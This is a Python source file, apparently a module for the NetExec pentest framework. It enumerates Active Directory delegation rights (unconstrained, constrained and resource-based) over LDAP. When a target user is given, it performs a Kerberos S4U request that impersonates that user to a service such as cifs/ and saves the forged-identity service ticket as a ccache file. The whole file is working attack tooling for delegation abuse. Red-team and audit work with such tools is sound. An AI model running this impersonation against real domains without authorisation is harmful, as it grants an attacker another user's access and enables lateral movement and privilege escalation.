"""Discover Active Directory delegation and request an impersonated service ticket."""

from dataclasses import dataclass, field
from pathlib import Path
from sys import exit
from time import time

from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.krb5.ccache import CCache
from impacket.krb5.constants import PrincipalNameType
from impacket.krb5.types import Principal
from impacket.ldap import ldaptypes
from ldap3.utils.conv import escape_filter_chars

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH
from nxc.playbooks.results import ActionResult, Artifact, ResultStatus
from nxc.protocols.smb.kerberos import kerberos_login_with_S4U


class NXCModule:
    """Show who may delegate to which service, then optionally request a ccache."""

    name = "delegation"
    description = "Enumerate constrained/RBCD delegation or request a delegated service ticket"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION

    @dataclass
    class Delegation:
        source: str
        source_type: str
        delegation_type: str
        target: str | None = None
        target_type: str | None = None
        spn: str | None = None
        protocol_transition: bool = False
        source_sid: str | None = None
        impersonation: str | None = None

    @dataclass
    class ResultData:
        delegations: list = field(default_factory=list)
        requested_user: str | None = None
        requested_spn: str | None = None
        ccache: str | None = None
        expires_at: int | None = None

    result_type = ResultData

    def options(self, context, module_options):
        """ACCOUNT    Limit enumeration to one delegating account.
        USER       Impersonated user; request a service ticket using the login account.
        SPN        Target service principal, e.g. cifs/dc01.example.test. Omit if unambiguous.
        OUTPUT     Explicit ccache path; default: NXC_PATH/delegation/<user>@<spn>.ccache.
        """
        self.account = module_options.get("ACCOUNT")
        self.user = module_options.get("USER")
        self.spn = module_options.get("SPN")
        self.output = module_options.get("OUTPUT")
        if (self.spn or self.output) and not self.user:
            context.log.fail("SPN and OUTPUT require USER")
            exit(1)

    def account_type(self, attributes):
        classes = attributes.get("objectClass", [])
        classes = classes if isinstance(classes, list) else [classes]
        if "msDS-GroupManagedServiceAccount" in classes:
            return "gMSA"
        if "msDS-ManagedServiceAccount" in classes:
            return "MSA"
        if "computer" in classes:
            return "computer"
        if "group" in classes:
            return "group"
        return "user"

    def rbcd_sids(self, raw_descriptor):
        descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_descriptor)
        dacl = descriptor["Dacl"]
        if not dacl:
            return []
        return list(dict.fromkeys(ace["Ace"]["Sid"].formatCanonical() for ace in dacl.aces if ace["TypeName"] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE")))

    def read_delegations(self, connection):
        flags = (UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
        search_filter = f"(&(|(userAccountControl:1.2.840.113556.1.4.803:={flags[0]})(userAccountControl:1.2.840.113556.1.4.803:={flags[1]})(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))(!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))"
        rows = connection.search(search_filter, ["sAMAccountName", "objectClass", "objectSid", "userAccountControl", "msDS-AllowedToDelegateTo", "msDS-AllowedToActOnBehalfOfOtherIdentity", "servicePrincipalName", "dNSHostName"])
        search_error = connection.last_search_error
        records = []
        rbcd_targets = []
        target_types = {}
        for raw in rows:
            parsed = parse_result_attributes([raw])
            if not parsed:
                continue
            attributes = parsed[0]
            values = {key.lower(): value for key, value in attributes.items()}
            name = values.get("samaccountname")
            if not name:
                continue
            kind = self.account_type(attributes)
            target_types[name] = kind
            uac = int(values.get("useraccountcontrol", 0))
            transition = bool(uac & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
            if uac & UF_TRUSTED_FOR_DELEGATION:
                records.append(self.Delegation(name, kind, "unconstrained", source_sid=values.get("objectsid"), impersonation="requires a forwarded user ticket"))
            spns = values.get("msds-allowedtodelegateto", [])
            records.extend(self.Delegation(name, kind, "constrained", spn=spn, protocol_transition=transition, source_sid=values.get("objectsid"), impersonation="S4U2Self for eligible users" if transition else "requires a forwarded user ticket") for spn in (spns if isinstance(spns, list) else [spns]))
            for attribute in raw["attributes"]:
                if str(attribute["type"]).lower() == "msds-allowedtoactonbehalfofotheridentity":
                    target_spns = values.get("serviceprincipalname", [])
                    target_spns = target_spns if isinstance(target_spns, list) else [target_spns]
                    for value in attribute["vals"].components:
                        rbcd_targets.extend((sid, name, target_spns) for sid in self.rbcd_sids(value.asOctets()))
        if rbcd_targets:
            sid_filter = "(|" + "".join(f"(objectSid={escape_filter_chars(sid)})" for sid in dict.fromkeys(item[0] for item in rbcd_targets)) + ")"
            principals = parse_result_attributes(connection.search(sid_filter, ["sAMAccountName", "objectSid", "objectClass", "userAccountControl"]))
            if connection.last_search_error:
                search_error = "; ".join(filter(None, (search_error, connection.last_search_error)))
            by_sid = {entry["objectSid"]: entry for entry in principals if "objectSid" in entry}
            for sid, target, spns in rbcd_targets:
                principal = by_sid.get(sid)
                if principal is None or int(principal.get("userAccountControl", 0)) & UF_ACCOUNTDISABLE:
                    continue
                records.extend(self.Delegation(principal["sAMAccountName"], self.account_type(principal), "resource-based constrained", target=target, target_type=target_types[target], spn=spn, source_sid=sid, impersonation="S4U2Self for eligible users") for spn in (spns or [None]))
        if self.account:
            records = [record for record in records if record.source.casefold() == self.account.casefold()]
        resolved = {}
        for record in records:
            if record.delegation_type != "constrained" or record.spn is None:
                continue
            if record.spn not in resolved:
                host = record.spn.split("/", 1)[-1].split(":", 1)[0].split("@", 1)[0]
                clauses = f"(servicePrincipalName={escape_filter_chars(record.spn)})(dNSHostName={escape_filter_chars(host)})(sAMAccountName={escape_filter_chars(host.split('.')[0] + '$')})"
                matches = parse_result_attributes(connection.search(f"(|{clauses})", ["sAMAccountName", "objectClass", "servicePrincipalName", "dNSHostName"]))
                if connection.last_search_error:
                    search_error = "; ".join(filter(None, (search_error, connection.last_search_error)))
                exact = [match for match in matches if record.spn.casefold() in [spn.casefold() for spn in (match.get("servicePrincipalName") if isinstance(match.get("servicePrincipalName"), list) else [match.get("servicePrincipalName")]) if isinstance(spn, str)]]
                resolved[record.spn] = (exact or matches or [None])[0]
            if resolved[record.spn]:
                record.target = resolved[record.spn].get("sAMAccountName")
                record.target_type = self.account_type(resolved[record.spn])
        records.sort(key=lambda record: (record.source.casefold(), record.delegation_type, record.target or "", record.spn or ""))
        return records, search_error

    def ticket_path(self):
        if self.output:
            return Path(self.output).expanduser()
        safe_user = "".join(c if c.isalnum() or c in "-_." else "_" for c in self.user)
        safe_spn = "".join(c if c.isalnum() or c in "-_." else "_" for c in self.spn)
        directory = (Path(NXC_PATH) / "delegation").resolve()
        path = directory / f"{safe_user}@{safe_spn}.ccache"
        if not path.resolve().is_relative_to(directory):
            raise ValueError("Default ticket path escapes the NetExec output directory")
        return path

    def request_ticket(self, connection):
        target = Principal(self.spn, type=PrincipalNameType.NT_SRV_INST.value)
        ticket, session_key = kerberos_login_with_S4U(connection.domain, connection.hostname, connection.username, connection.password or "", connection.nthash or "", connection.lmhash or "", connection.aesKey or "", connection.kdcHost or connection.host, self.user, target, connection.use_kcache)
        cache = CCache()
        cache.fromTGS(ticket["KDC_REP"], session_key, session_key)
        if len(cache.credentials) != 1:
            raise RuntimeError("Delegation request did not produce one service ticket")
        expires_at = int(cache.credentials[0]["time"]["endtime"])
        if expires_at <= time():
            raise RuntimeError("Delegation request produced an expired service ticket")
        path = self.ticket_path()
        path.parent.mkdir(parents=True, exist_ok=True)
        cache.saveFile(str(path))
        return path, expires_at

    def choose_spn(self, records, account):
        eligible = [record for record in records if record.source.casefold() == account.casefold() and record.spn and (record.protocol_transition or record.delegation_type == "resource-based constrained")]
        candidates = sorted({record.spn for record in eligible})
        if len(candidates) == 1:
            return candidates[0]
        cifs = [spn for spn in candidates if spn.casefold().startswith("cifs/")]
        if len(cifs) == 1:
            return cifs[0]
        targets = {record.target.casefold() for record in eligible if record.target}
        if len(targets) == 1 and cifs:
            fqdn_cifs = [spn for spn in cifs if "." in spn.split("/", 1)[1]]
            if len(fqdn_cifs) == 1:
                return fqdn_cifs[0]
        return None

    def on_login(self, context, connection):
        data = self.ResultData(requested_user=self.user, requested_spn=self.spn)
        data.delegations, search_error = self.read_delegations(connection)
        for record in data.delegations:
            destination = f"{record.target} ({record.target_type})" if record.target else ""
            if record.spn:
                destination = f"{destination} / {record.spn}" if destination else record.spn
            context.log.highlight(f"{record.source} ({record.source_type}) -> {destination or 'any service'} [{record.delegation_type}{', protocol transition' if record.protocol_transition else ''}]")
        if search_error:
            context.log.fail(search_error)
            return ActionResult("ldap", self.name, connection.host, ResultStatus.FAILED, data, error=search_error)
        if not self.user:
            if not data.delegations:
                context.log.display("No delegation rights found")
            return ActionResult("ldap", self.name, connection.host, ResultStatus.SUCCESS if data.delegations else ResultStatus.NEGATIVE, data)
        if not self.spn:
            self.spn = self.choose_spn(data.delegations, connection.username or "")
            if not self.spn:
                message = f"Cannot select one service for {connection.username}; specify SPN from the delegation results"
                context.log.fail(message)
                return ActionResult("ldap", self.name, connection.host, ResultStatus.FAILED, data, error=message)
            data.requested_spn = self.spn
            context.log.display(f"Selected {self.spn} for {connection.username}")
        try:
            path, expires_at = self.request_ticket(connection)
        except Exception as e:
            message = str(e) or type(e).__name__
            context.log.fail(message)
            return ActionResult("ldap", self.name, connection.host, ResultStatus.FAILED, data, error=message)
        data.ccache = str(path)
        data.expires_at = expires_at
        context.log.success(f"Saved delegated ticket for {self.user} to {path}")
        return ActionResult("ldap", self.name, connection.host, ResultStatus.SUCCESS, data, artifacts=[Artifact(path, "kerberos_ccache")])
